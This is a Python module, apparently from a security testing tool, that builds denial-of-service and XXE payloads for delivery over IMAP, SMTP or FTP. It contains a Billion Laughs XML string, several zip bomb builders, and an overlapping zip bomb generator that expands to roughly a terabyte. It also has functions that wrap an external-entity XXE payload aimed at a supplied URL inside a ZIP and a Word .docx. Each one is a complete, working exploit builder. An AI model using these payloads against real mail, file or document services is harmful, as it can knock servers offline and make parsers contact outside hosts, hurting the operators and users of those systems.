"""XML / ZIP stress payloads for IMAP ZIPXXE (same set as SMTP ZIPXXE / FTP DOS).

Do not import heavy optional deps here; keep this module safe for all entrypoints.

Payloads follow the classic Billion Laughs nested-entity expansion, OWASP XXE
(SYSTEM entity + OOXML ZIP container), layered DEFLATE zip bombs, and an
overlapping ZIP bomb (PKWARE APPNOTE + RFC 1951; Fifield, USENIX WOOT 2019).
"""

from __future__ import annotations

import struct
import zipfile
import zlib
from io import BytesIO

# Classic billion-laughs entity expansion (~10^9 "lol" when expanded; small on disk).
BILLION_LAUGHS_XML: str = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


def build_minimal_zip_bomb() -> bytes:
    """Layered DEFLATE bomb: small on the wire, moderate expansion when extracted (lab-safe default)."""
    bio = BytesIO()
    data = b"\x00" * (10 * 1024)
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(20):
            zf.writestr(f"layer_{i}.bin", data)
    return bio.getvalue()


def build_full_zip_bomb() -> bytes:
    """High-ratio DEFLATE bomb: ~100KB compressed → ~100MB expanded (isolated labs only)."""
    bio = BytesIO()
    chunk = b"\x00" * (1024 * 1024)
    data_10mb = chunk * 10
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(10):
            zf.writestr(f"bomb_{i}.bin", data_10mb)
    return bio.getvalue()


def _deflate_zeros(n: int) -> tuple[bytes, int]:
    """RFC 1951 raw DEFLATE of n NUL bytes + IEEE CRC-32 (ZIP APPNOTE)."""
    crc = 0
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
    parts: list[bytes] = []
    chunk = b"\x00" * (1024 * 1024)
    left = n
    while left:
        step = min(left, len(chunk))
        block = chunk if step == len(chunk) else chunk[:step]
        crc = zlib.crc32(block, crc)
        parts.append(compressor.compress(block))
        left -= step
    parts.append(compressor.flush())
    return b"".join(parts), crc & 0xFFFFFFFF


def _gf2_matrix_times(mat: list[int], vec: int) -> int:
    n = 0
    i = 0
    while vec:
        if vec & 1:
            n ^= mat[i]
        vec >>= 1
        i += 1
    return n


def _gf2_matrix_square(mat: list[int]) -> list[int]:
    return [_gf2_matrix_times(mat, mat[n]) for n in range(32)]


def _crc32_zero_byte_ops(max_bits: int = 40) -> list[list[int]]:
    """Operators that append 2^k zero bytes to a CRC-32 (zlib crc32_combine)."""
    odd = [0] * 32
    odd[0] = 0xEDB88320
    row = 1
    for n in range(1, 32):
        odd[n] = row
        row <<= 1
    even = _gf2_matrix_square(odd)  # 2 zero bits
    prev = _gf2_matrix_square(even)  # 4 zero bits
    ops: list[list[int]] = []
    for _ in range(max_bits):
        prev = _gf2_matrix_square(prev)  # 1, 2, 4, … zero bytes
        ops.append(prev)
    return ops


_CRC32_ZERO_BYTE_OPS = _crc32_zero_byte_ops()


def _crc32_append_zeros(crc: int, n: int) -> int:
    crc &= 0xFFFFFFFF
    k = 0
    while n:
        if n & 1:
            crc = _gf2_matrix_times(_CRC32_ZERO_BYTE_OPS[k], crc)
        n >>= 1
        k += 1
    return crc


def _crc32_combine(crc1: int, crc2: int, len2: int) -> int:
    """zlib crc32_combine: CRC-32(A+B) from CRC-32(A), CRC-32(B), len(B)."""
    if len2 <= 0:
        return crc1 & 0xFFFFFFFF
    return (_crc32_append_zeros(crc1, len2) ^ (crc2 & 0xFFFFFFFF)) & 0xFFFFFFFF


def _deflate_stored_header(n: int) -> bytes:
    """RFC 1951 §3.2.4 non-compressed block header, BFINAL=0, BTYPE=00."""
    if not (0 <= n <= 0xFFFF):
        raise ValueError("stored-block LEN must fit in 16 bits")
    return struct.pack("<BHH", 0x00, n, n ^ 0xFFFF)


def _zip_local_header(name: bytes, crc: int, comp: int, uncomp: int) -> bytes:
    """PKWARE APPNOTE local file header (DEFLATE, version 2.0)."""
    return struct.pack(
        "<4sHHHHHIIIHH",
        b"PK\x03\x04",
        20,
        0,
        8,
        0,
        0,
        crc,
        comp,
        uncomp,
        len(name),
        0,
    ) + name


def _zip_central_header(name: bytes, crc: int, comp: int, uncomp: int, offset: int) -> bytes:
    """PKWARE APPNOTE central directory file header."""
    return struct.pack(
        "<4sHHHHHHIIIHHHHHII",
        b"PK\x01\x02",
        20,
        20,
        0,
        8,
        0,
        0,
        crc,
        comp,
        uncomp,
        len(name),
        0,
        0,
        0,
        0,
        0,
        offset,
    ) + name


def build_huge_zip_bomb(
    *,
    num_files: int = 32768,
    uncompressed: int = 32 * 1024 * 1024,
) -> bytes:
    """
    Quoted-overlap ZIP bomb (PKWARE APPNOTE + RFC 1951 DEFLATE).

    Fifield, USENIX WOOT 2019 (“A better zip bomb”), quoted-overlap mode:
    one DEFLATE kernel of NULs is reused by chaining later local file headers
    inside RFC 1951 stored blocks (BFINAL=0, BTYPE=00). Each central-directory
    name matches its local header (unlike full-overlap). Not recursive. Zip64
    is not used. Default: 32768 files × 32 MiB kernel ≈ 1.00 TiB expanded.
    """
    if not (1 <= num_files <= 0xFFFE):
        raise ValueError("num_files must fit in EOCD uint16 (max 65534)")
    if not (1 <= uncompressed <= 0xFFFFFFFE):
        raise ValueError("uncompressed kernel must fit in 32-bit ZIP field")
    kernel, kernel_crc = _deflate_zeros(uncompressed)
    names = [f"{i:05d}".encode("ascii") for i in range(num_files)]
    lfhs = [b""] * num_files
    meta: list[tuple[int, int, int]] = [(0, 0, 0)] * num_files
    prefix_crc = 0
    prefix_len = 0
    comp_size = len(kernel)
    uncomp_size = uncompressed
    crc = kernel_crc
    for i in range(num_files - 1, -1, -1):
        if uncomp_size > 0xFFFFFFFE:
            raise ValueError("quoted uncompressed size exceeds 32-bit ZIP field")
        lfhs[i] = _zip_local_header(names[i], crc, comp_size, uncomp_size)
        meta[i] = (crc, comp_size, uncomp_size)
        if i == 0:
            break
        prefix_crc = _crc32_combine(zlib.crc32(lfhs[i]) & 0xFFFFFFFF, prefix_crc, prefix_len)
        prefix_len += len(lfhs[i])
        crc = _crc32_combine(prefix_crc, kernel_crc, uncompressed)
        uncomp_size = prefix_len + uncompressed
        comp_size = 5 + len(lfhs[i]) + comp_size
    chunks: list[bytes] = [lfhs[0]]
    for i in range(1, num_files):
        chunks.append(_deflate_stored_header(len(lfhs[i])))
        chunks.append(lfhs[i])
    chunks.append(kernel)
    local = b"".join(chunks)
    offsets: list[int] = []
    off = 0
    for i in range(num_files):
        offsets.append(off)
        off += len(lfhs[i])
        if i != num_files - 1:
            off += 5
    cd = b"".join(
        _zip_central_header(names[i], meta[i][0], meta[i][1], meta[i][2], offsets[i])
        for i in range(num_files)
    )
    eocd = struct.pack(
        "<4sHHHHIIH",
        b"PK\x05\x06",
        0,
        0,
        num_files,
        num_files,
        len(cd),
        len(local),
        0,
    )
    return local + cd + eocd


def xxe_xml_template(url: str) -> str:
    """Blind/OOB XXE: SYSTEM entity pointing at a canary URL (OWASP WSTG XML Injection)."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>\n'
        "<document><content>&xxe;</content></document>"
    )


def build_zip_with_xxe(url: str) -> bytes:
    """ZIP containing report.xml with an external entity (parser may fetch canary on extract)."""
    bio = BytesIO()
    xml_content = xxe_xml_template(url).encode("utf-8")
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.xml", xml_content)
    return bio.getvalue()


def build_minimal_docx_with_xxe(url: str) -> bytes:
    """Minimal OOXML .docx with XXE in word/document.xml (office formats are ZIP+XML)."""
    xml_content = xxe_xml_template(url).encode("utf-8")
    bio = BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ).encode("utf-8"))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ).encode("utf-8"))
        zf.writestr("word/document.xml", xml_content)
    return bio.getvalue()
